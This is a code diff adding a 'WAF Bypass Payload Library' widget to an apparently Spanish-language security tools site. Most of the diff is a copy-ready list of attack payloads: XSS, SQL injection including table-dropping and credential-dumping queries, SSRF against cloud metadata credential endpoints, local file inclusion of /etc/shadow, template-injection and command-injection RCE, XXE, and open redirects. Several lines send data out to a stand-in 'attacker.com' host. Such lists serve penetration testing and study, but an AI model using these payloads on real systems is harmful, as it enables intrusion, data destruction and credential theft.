@@ -1780,5 +1780,291 @@ document.addEventListener('DOMContentLoaded', function() {
 
         // Init
         generateCurl();
-    })();// <-- Este paréntesis cierra la burbuja de la que te hablaba
+    })();
+    // =========================================================
+    // 22. Herramienta: WAF Bypass Payload Library
+    // =========================================================
+    (function() {
+        const wafCat = document.getElementById('waf-cat');
+        if (!wafCat) return; // Salir si no estamos en la página del WAF
+
+        console.log("✅ WAF Payload Library cargada.");
+
+        const wafSearch = document.getElementById('waf-search');
+        const wafList = document.getElementById('waf-list');
+        const wafCount = document.getElementById('waf-count');
+        const btnCopyAll = document.getElementById('btn-waf-copy');
+        const btnDownload = document.getElementById('btn-waf-dl');
+        const lang = window.LANG || 'es';
+
+        // Gran base de datos de Payloads
+        const PAYLOADS = {
+            xss: [
+                {tag:'Basic', p:'<script>alert(1)<\/script>'},
+                {tag:'Basic', p:'<img src=x onerror=alert(1)>'},
+                {tag:'Basic', p:'<svg onload=alert(1)>'},
+                {tag:'Basic', p:"<body onload=alert`1`>"},
+                {tag:'Case bypass', p:'<ScRiPt>alert(1)<\/ScRiPt>'},
+                {tag:'Case bypass', p:'<IMG SRC=x OnErRoR=alert(1)>'},
+                {tag:'HTML encoded', p:'&lt;script&gt;alert(1)&lt;/script&gt;'},
+                {tag:'URL encoded', p:'%3Cscript%3Ealert(1)%3C%2Fscript%3E'},
+                {tag:'Double encoded', p:'%253Cscript%253Ealert(1)%253C%252Fscript%253E'},
+                {tag:'Unicode', p:'\u003cscript\u003ealert(1)\u003c/script\u003e'},
+                {tag:'Null byte', p:'<scri%00pt>alert(1)</scri%00pt>'},
+                {tag:'Tab/newline', p:'<script\t>alert(1)</script>'},
+                {tag:'Comment', p:'<scri<!--xss-->pt>alert(1)</sc<!--xss-->ript>'},
+                {tag:'JS Protocol', p:"javascript:alert(1)"},
+                {tag:'JS Protocol', p:"jAvAsCrIpT:alert(1)"},
+                {tag:'JS Protocol', p:"java&#115;cript:alert(1)"},
+                {tag:'Data URI', p:'<a href="data:text/html,<script>alert(1)<\/script>">click</a>'},
+                {tag:'SVG', p:"<svg/onload=alert(1)>"},
+                {tag:'SVG', p:'<svg><script>alert(1)<\/script></svg>'},
+                {tag:'Input', p:'" onmouseover="alert(1)'},
+                {tag:'Input', p:"' onfocus='alert(1)' autofocus='"},
+                {tag:'Template', p:'{{constructor.constructor("alert(1)")()}}'},
+                {tag:'Angular', p:'{{7*7}}{{constructor.constructor("alert(1)")()}}'},
+                {tag:'DOM XSS', p:"#<img src=x onerror=alert(1)>"},
+                {tag:'Polyglot', p:"jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>>"},
+                {tag:'Filter bypass', p:'<details open ontoggle=alert(1)>'},
+                {tag:'Filter bypass', p:'<video><source onerror="alert(1)">'},
+                {tag:'Filter bypass', p:'<marquee onstart=alert(1)>'},
+                {tag:'Iframe', p:'<iframe src="javascript:alert(1)">'},
+                {tag:'Iframe', p:'<iframe srcdoc="<script>alert(1)<\/script>">'},
+            ],
+            sqli: [
+                {tag:'Basic', p:"' OR '1'='1"},
+                {tag:'Basic', p:"' OR 1=1--"},
+                {tag:'Basic', p:"1' OR '1'='1'--"},
+                {tag:'Basic', p:"admin'--"},
+                {tag:'Union', p:"' UNION SELECT null,null,null--"},
+                {tag:'Union', p:"' UNION SELECT username,password,null FROM users--"},
+                {tag:'Case bypass', p:"' Or 1=1--"},
+                {tag:'Case bypass', p:"' uNiOn sElEcT null--"},
+                {tag:'Comment bypass', p:"'/**/OR/**/1=1--"},
+                {tag:'Comment bypass', p:"'/*!OR*/1=1--"},
+                {tag:'URL encoded', p:"%27%20OR%201%3D1--"},
+                {tag:'Double encoded', p:"%2527%2520OR%25201%253D1--"},
+                {tag:'Hex bypass', p:"' OR 0x313d31--"},
+                {tag:'Time-based', p:"'; WAITFOR DELAY '0:0:5'--"},
+                {tag:'Time-based', p:"' AND SLEEP(5)--"},
+                {tag:'Stacked', p:"'; DROP TABLE users--"},
+                {tag:'Error-based', p:"' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--"},
+                {tag:'Boolean', p:"' AND 1=2--"},
+                {tag:'Boolean', p:"' AND 1=1--"},
+                {tag:'Out-of-band', p:"' UNION SELECT LOAD_FILE('/etc/passwd')--"},
+                {tag:'Whitespace', p:"'\t OR\t 1=1--"},
+                {tag:'Newline', p:"'\nOR\n1=1--"},
+                {tag:'WAF bypass', p:"'%20OR%201%3D1--"},
+                {tag:'WAF bypass', p:"'||'1'='1"},
+                {tag:'NoSQL', p:'{"$gt":""}'},
+                {tag:'NoSQL', p:'{"$where":"sleep(5000)"}'},
+            ],
+            ssrf: [
+                {tag:'Localhost', p:'http://localhost/'},
+                {tag:'Localhost', p:'http://127.0.0.1/'},
+                {tag:'Localhost', p:'http://[::1]/'},
+                {tag:'Localhost', p:'http://0.0.0.0/'},
+                {tag:'Localhost', p:'http://0/'},
+                {tag:'Localhost', p:'http://127.1/'},
+                {tag:'Localhost', p:'http://2130706433/'},
+                {tag:'Localhost', p:'http://0x7f000001/'},
+                {tag:'Protocol', p:'file:///etc/passwd'},
+                {tag:'Protocol', p:'file:///C:/Windows/win.ini'},
+                {tag:'Protocol', p:'dict://localhost:6379/info'},
+                {tag:'Protocol', p:'gopher://localhost:6379/_INFO%0D%0A'},
+                {tag:'AWS metadata', p:'http://169.254.169.254/latest/meta-data/'},
+                {tag:'AWS metadata', p:'http://169.254.169.254/latest/meta-data/iam/security-credentials/'},
+                {tag:'GCP metadata', p:'http://metadata.google.internal/computeMetadata/v1/'},
+                {tag:'Azure metadata', p:'http://169.254.169.254/metadata/instance?api-version=2021-02-01'},
+                {tag:'Azure metadata', p:'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/'},
+                {tag:'DNS rebind', p:'http://7f000001.1.1.1.1.nip.io/'},
+                {tag:'IPv6 bypass', p:'http://[::ffff:127.0.0.1]/'},
+                {tag:'Redirect', p:'http://attacker.com/redirect?url=http://localhost/'},
+                {tag:'URL bypass', p:'http://localtest.me/'},
+                {tag:'URL bypass', p:'http://spoofed.burpcollaborator.net/'},
+            ],
+            lfi: [
+                {tag:'Basic', p:'../../../etc/passwd'},
+                {tag:'Basic', p:'../../../../../../etc/shadow'},
+                {tag:'Basic', p:'....//....//....//etc/passwd'},
+                {tag:'URL encoded', p:'..%2F..%2F..%2Fetc%2Fpasswd'},
+                {tag:'Double encoded', p:'..%252F..%252F..%252Fetc%252Fpasswd'},
+                {tag:'Null byte', p:'../../../etc/passwd%00'},
+                {tag:'Unicode', p:'..%c0%af..%c0%af..%c0%afetc/passwd'},
+                {tag:'Windows', p:'..\\..\\..\\Windows\\System32\\drivers\\etc\\hosts'},
+                {tag:'Windows', p:'..%5C..%5C..%5CWindows%5Csystem.ini'},
+                {tag:'PHP wrappers', p:'php://filter/convert.base64-encode/resource=index.php'},
+                {tag:'PHP wrappers', p:'php://input'},
+                {tag:'PHP wrappers', p:'data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4='},
+                {tag:'PHP wrappers', p:'expect://id'},
+                {tag:'Log poisoning', p:'/var/log/apache2/access.log'},
+                {tag:'Log poisoning', p:'/var/log/nginx/access.log'},
+                {tag:'Log poisoning', p:'/proc/self/environ'},
+                {tag:'Interesting', p:'/etc/hosts'},
+                {tag:'Interesting', p:'/etc/crontab'},
+                {tag:'Interesting', p:'/proc/self/cmdline'},
+                {tag:'Interesting', p:'C:\\Windows\\System32\\drivers\\etc\\hosts'},
+            ],
+            ssti: [
+                {tag:'Detection', p:'{{7*7}}'},
+                {tag:'Detection', p:'${7*7}'},
+                {tag:'Detection', p:'<%= 7*7 %>'},
+                {tag:'Detection', p:'{{7*\'7\'}}'},
+                {tag:'Jinja2 RCE', p:"{{''.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()[0]}}"},
+                {tag:'Jinja2 RCE', p:"{{config.__class__.__init__.__globals__['os'].popen('id').read()}}"},
+                {tag:'Jinja2 bypass', p:"{%raw%}{{7*7}}{%endraw%}"},
+                {tag:'Twig RCE', p:"{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}"},
+                {tag:'Freemarker RCE', p:'${freemarker.template.utility.Execute?new()("id")}'},
+                {tag:'Velocity RCE', p:'#set($x="")#set($rt=$x.class.forName("java.lang.Runtime"))#set($chr=$x.class.forName("java.lang.Character"))#set($str=$x.class.forName("java.lang.String"))#set($ex=$rt.getRuntime().exec("id"))'},
+                {tag:'ERB (Ruby)', p:'<%= system("id") %>'},
+                {tag:'ERB (Ruby)', p:'<%= `id` %>'},
+                {tag:'Smarty', p:'{system("id")}'},
+                {tag:'Pebble', p:'{{ variable.getClass().forName("java.lang.Runtime").getMethod("exec","".getClass()).invoke(variable.getClass().forName("java.lang.Runtime").getMethod("getRuntime").invoke(null),"id") }}'},
+            ],
+            cmdi: [
+                {tag:'Basic Unix', p:'; id'},
+                {tag:'Basic Unix', p:'| id'},
+                {tag:'Basic Unix', p:'|| id'},
+                {tag:'Basic Unix', p:'& id'},
+                {tag:'Basic Unix', p:'&& id'},
+                {tag:'Basic Unix', p:'`id`'},
+                {tag:'Basic Unix', p:'$(id)'},
+                {tag:'Windows', p:'& whoami'},
+                {tag:'Windows', p:'| whoami'},
+                {tag:'Windows', p:'&& ipconfig'},
+                {tag:'Windows', p:'; dir'},
+                {tag:'Blind - oob', p:'; curl http://attacker.com/$(whoami)'},
+                {tag:'Blind - oob', p:'| nslookup $(whoami).attacker.com'},
+                {tag:'Blind - time', p:'; sleep 5'},
+                {tag:'Blind - time', p:'& timeout /T 5'},
+                {tag:'Bypass space', p:';{IFS}id'},
+                {tag:'Bypass space', p:';${IFS}id'},
+                {tag:'Bypass space', p:';$IFS$9id'},
+                {tag:'Bypass filter', p:';w\\ho\\am\\i'},
+                {tag:'Bypass filter', p:";/???/??t /???/p??s??"},
+                {tag:'URL encoded', p:'%3B%20id'},
+                {tag:'Newline', p:'%0a id'},
+            ],
+            xxe: [
+                {tag:'Basic', p:'<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>'},
+                {tag:'Basic Win', p:'<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">]><root>&xxe;</root>'},
+                {tag:'SSRF via XXE', p:'<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><root>&xxe;</root>'},
+                {tag:'Blind OOB', p:'<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd"> %xxe;]><root></root>'},
+                {tag:'Error-based', p:'<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///nonexistent">]><root>&xxe;</root>'},
+                {tag:'XInclude', p:'<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>'},
+                {tag:'SVG XXE', p:'<?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd" > ]><svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg>'},
+                {tag:'SOAP XXE', p:'<![CDATA[<!DOCTYPE doc [<!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">%dtd;]><doc>&external;</doc>]]>'},
+                {tag:'PHP expect', p:'<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "expect://id">]><root>&xxe;</root>'},
+            ],
+            redirect: [
+                {tag:'Basic', p:'//evil.com'},
+                {tag:'Basic', p:'///evil.com'},
+                {tag:'Basic', p:'https://evil.com'},
+                {tag:'Basic', p:'//evil%2ecom'},
+                {tag:'Protocol', p:'javascript:alert(1)'},
+                {tag:'Protocol', p:'data:text/html,<script>alert(1)<\/script>'},
+                {tag:'@bypass', p:'https://trusted.com@evil.com'},
+                {tag:'@bypass', p:'//trusted.com%40evil.com'},
+                {tag:'Subdomain', p:'https://trusted.com.evil.com'},
+                {tag:'CRLF', p:'/redirect?url=%0d%0aLocation:%20https://evil.com'},
+                {tag:'URL encoded', p:'%68%74%74%70%73%3A%2F%2Fevil.com'},
+                {tag:'Double encoded', p:'%2568%2574%2574%2570%2573%253A%252F%252Fevil.com'},
+                {tag:'Unicode', p:'https://evil｡com'},
+                {tag:'Whitelisted', p:'https://evil.com?url=https://trusted.com'},
+                {tag:'Fragment', p:'https://trusted.com#https://evil.com'},
+            ]
+        };
+
+        function escapeHTML(s) {
+            const d = document.createElement('div');
+            d.textContent = String(s || '');
+            return d.innerHTML;
+        }
+
+        function renderPayloads() {
+            const cat = wafCat.value;
+            const q = wafSearch.value.toLowerCase();
+            const list = (PAYLOADS[cat] || []).filter(p => !q || p.p.toLowerCase().includes(q) || p.tag.toLowerCase().includes(q));
+
+            wafCount.innerHTML = `<span style="color:var(--cyan); font-weight:bold;">${list.length}</span> ${lang === 'es' ? 'payloads encontrados' : 'payloads found'}`;
+
+            let html = '';
+            let curTag = '';
+
+            list.forEach(item => {
+                if (item.tag !== curTag) {
+                    if (curTag) html += '</div>'; // Cerrar bloque anterior
+                    curTag = item.tag;
+                    html += `<div class="waf-tag-header">${escapeHTML(item.tag)}</div><div>`;
+                }
+                html += `
+                <div class="waf-payload-row">
+                    <div class="waf-payload-text" data-copy="${escapeHTML(item.p)}" title="${lang === 'es' ? 'Clic para copiar' : 'Click to copy'}">
+                        ${escapeHTML(item.p)}
+                    </div>
+                    <button type="button" class="copy-btn-mini" data-copy="${escapeHTML(item.p)}">📋</button>
+                </div>`;
+            });
+
+            if (curTag) html += '</div>';
+            if (!list.length) html = `<p style="font-family:var(--mono); color:var(--gray); padding:1rem 0;">${lang === 'es' ? 'No se encontraron payloads.' : 'No payloads found.'}</p>`;
+
+            wafList.innerHTML = html;
+
+            // Delegación de eventos para copiar (Sirve para el texto y para el botón)
+            document.querySelectorAll('#waf-list .waf-payload-text, #waf-list .copy-btn-mini').forEach(el => {
+                el.addEventListener('click', function() {
+                    const txtToCopy = this.dataset.copy;
+                    if (typeof window.copyToClipboard === 'function') {
+                        window.copyToClipboard(txtToCopy, this); // Usa la función global segura
+                    } else {
+                        navigator.clipboard.writeText(txtToCopy).catch(e => console.error(e));
+                    }
+                    
+                    // Feedback visual
+                    if (this.tagName === 'BUTTON') {
+                        this.textContent = '✅';
+                        setTimeout(() => this.textContent = '📋', 1500);
+                    } else {
+                        const originalBorder = this.style.borderColor;
+                        this.style.borderColor = 'var(--cyan)';
+                        setTimeout(() => this.style.borderColor = originalBorder, 500);
+                    }
+                });
+            });
+        }
+
+        // Eventos
+        wafCat.addEventListener('change', renderPayloads);
+        wafSearch.addEventListener('input', renderPayloads);
+
+        btnCopyAll.addEventListener('click', function() {
+            const cat = wafCat.value;
+            const all = (PAYLOADS[cat] || []).map(p => p.p).join('\n');
+            if (typeof window.copyToClipboard === 'function') {
+                window.copyToClipboard(all, this);
+            } else {
+                navigator.clipboard.writeText(all).catch(e => console.error(e));
+            }
+            const originalText = this.innerHTML;
+            this.textContent = '✅ ' + (lang === 'es' ? 'Copiados' : 'Copied');
+            setTimeout(() => this.innerHTML = originalText, 2000);
+        });
+
+        btnDownload.addEventListener('click', () => {
+            const cat = wafCat.value;
+            const all = (PAYLOADS[cat] || []).map(p => p.p).join('\n');
+            const blob = new Blob([all], { type: 'text/plain' });
+            const a = document.createElement('a');
+            a.href = URL.createObjectURL(blob);
+            a.download = `waf_bypass_${cat}_cyberescudo.txt`;
+            document.body.appendChild(a);
+            a.click();
+            document.body.removeChild(a);
+        });
+
+        // Init
+        renderPayloads();
+
+    })();
 });
